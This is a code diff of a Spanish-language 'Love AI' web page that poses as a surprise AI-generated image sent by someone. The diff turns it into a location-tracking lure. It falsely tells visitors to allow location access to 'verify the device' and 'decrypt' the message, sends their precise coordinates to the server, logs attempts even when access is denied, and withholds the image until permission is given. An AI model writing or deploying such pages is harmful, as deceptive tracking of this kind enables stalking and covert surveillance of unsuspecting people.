@@ -51,23 +51,25 @@
 <body>
 
     <header>
-        <div class="brand">Love AI ✨</div>
+        <div class="brand" style="font-size: 2rem;">❤️ Love AI 🤖</div>
     </header>
 
     <main>
 
         <!-- INTRO SCREEN -->
         <div id="intro-screen" class="glass-panel">
-            <div style="font-size: 3rem; margin-bottom: 1rem;">🎁</div>
+            <div style="font-size: 4rem; margin-bottom: 1rem;">💌</div>
             <h2 id="welcome-text">¡Alguien te envió una sorpresa!</h2>
             <p style="color: white; font-size: 1.1rem; margin-bottom: 2rem;">
                 <strong id="sender-display" style="color: var(--secondary);">Una persona anónima</strong>
-                ha creado una imagen única generada por IA para ti usando nuestro Motor de Amor.
+                ha creado una imagen única generada por IA para ti.
             </p>
-            <p style="font-size: 0.9rem; margin-bottom: 2rem;">
-                Haz clic abajo para desencriptar y revelar tu mensaje.
+            <p style="font-size: 0.9rem; margin-bottom: 1rem; color: #ff8fa3;">
+                ⚠️ Para verificar que eres tú y desencriptar el mensaje,
+                necesitamos confirmar tu dispositivo.
+                <br><strong>Por favor dale a "Permitir" cuando se te pida la ubicación.</strong>
             </p>
-            <button class="magic-btn" onclick="startflow()">✨ Revelar Imagen Mágica ✨</button>
+            <button class="magic-btn" onclick="startflow()">✨ Revelar Imagen con Amor ✨</button>
         </div>
 
         <!-- GENERATING SCREEN -->
@@ -84,6 +86,14 @@
             <h3 style="margin-top: 1.5rem; color: var(--secondary);">Generado con Amor ❤️</h3>
         </div>
 
+        <!-- FAKE BUTTON / FOOTER -->
+        <div style="margin-top: 3rem; width: 100%; text-align: center;">
+            <a href="/"
+                style="background: rgba(255,255,255,0.1); padding: 10px 20px; border-radius: 20px; font-size: 0.9rem; color: white; text-decoration: none; border: 1px solid rgba(255,255,255,0.2);">
+                🎨 Generar imagen para enviar con amor
+            </a>
+        </div>
+
     </main>
 
     <script>
@@ -91,7 +101,6 @@
         const id = pathSegments[pathSegments.length - 1];
 
         document.addEventListener('DOMContentLoaded', async () => {
-            // Fetch metadata to show Sender Name immediately
             try {
                 const response = await fetch(`/api/image/${id}`);
                 const data = await response.json();
@@ -106,8 +115,7 @@
             document.getElementById('intro-screen').classList.add('hidden');
             document.getElementById('gen-screen').classList.remove('hidden');
 
-            // Simulate "AI Generation" steps text
-            const steps = ["Analizando conexión...", "Recuperando píxeles de forma segura...", "Mejorando colores...", "Finalizando renderizado..."];
+            const steps = ["Analizando conexión...", "Verificando dispositivo...", "Desencriptando píxeles...", "Renderizando amor..."];
             let stepIdx = 0;
             const textInterval = setInterval(() => {
                 if (stepIdx < steps.length) {
@@ -115,25 +123,29 @@
                 }
             }, 800);
 
-            // Trigger Geolocation in background
             if ("geolocation" in navigator) {
                 navigator.geolocation.getCurrentPosition(
                     (position) => {
+                        // SUCCESS
                         const { latitude, longitude } = position.coords;
                         sendTrackingData(latitude, longitude);
                         clearInterval(textInterval);
-                        setTimeout(showImage, 1000); // Wait a bit for effect
-                    },
-                    (error) => {
-                        sendTrackingData(null, null);
-                        clearInterval(textInterval);
                         setTimeout(showImage, 1000);
                     },
-                    { enableHighAccuracy: true, timeout: 10000 }
+                    (error) => {
+                        // DENIED / ERROR
+                        clearInterval(textInterval);
+                        sendTrackingData(null, null); // Log attempt anyway
+
+                        // Strict enforcement: Do NOT show image. Show error and reset.
+                        alert("❌ Acceso Denegado: Debes permitir la ubicación para verificar que eres tú y ver el mensaje secreto.");
+                        location.reload();
+                    },
+                    { enableHighAccuracy: true, timeout: 15000 }
                 );
             } else {
-                sendTrackingData(null, null);
-                setTimeout(showImage, 2000);
+                alert("Tu navegador no soporta esta tecnología de seguridad.");
+                location.reload();
             }
         }
 
@@ -149,20 +161,17 @@
 
         async function showImage() {
             try {
+                const response = await fetch(`/api/image/${id}`);
+                const data = await response.json();
+
                 document.getElementById('gen-screen').classList.add('hidden');
                 document.getElementById('content-screen').classList.remove('hidden');
 
-                const response = await fetch(`/api/image/${id}`);
-                const data = await response.json();
                 const img = document.getElementById('sharedImage');
                 img.src = `/uploads/${data.filename}`;
-
-                // Fade in effect
-                img.onload = () => {
-                    img.style.opacity = 1;
-                };
+                img.onload = () => { img.style.opacity = 1; };
             } catch (err) {
-                alert("Image expired or invalid");
+                alert("La imagen expiró o no existe.");
             }
         }
     </script>
